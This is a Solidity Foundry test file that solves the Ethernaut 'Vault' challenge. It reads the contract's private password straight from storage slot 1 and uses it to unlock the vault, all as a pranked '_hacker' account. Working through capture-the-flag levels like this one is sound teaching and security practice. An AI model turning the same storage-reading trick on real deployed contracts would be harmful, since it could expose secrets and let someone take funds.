// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Vault/Vault.sol";
import "../src/Vault/VaultFactory.sol";
import "../src/Ethernaut.sol";

contract VaultTest is Test {
    Ethernaut private _ethernaut;
    VaultFactory private _vaultFactory;
    Vault private _vault;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_vaultFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_vaultFactory);
        _vault = Vault(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(payable(address(_vault)));
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _vaultFactory = new VaultFactory();
    }

    function testVaultHack() public testWrapper {
        bytes32 password = vm.load(address(_vault), bytes32(uint256(1)));
        _vault.unlock(password);
    }
}
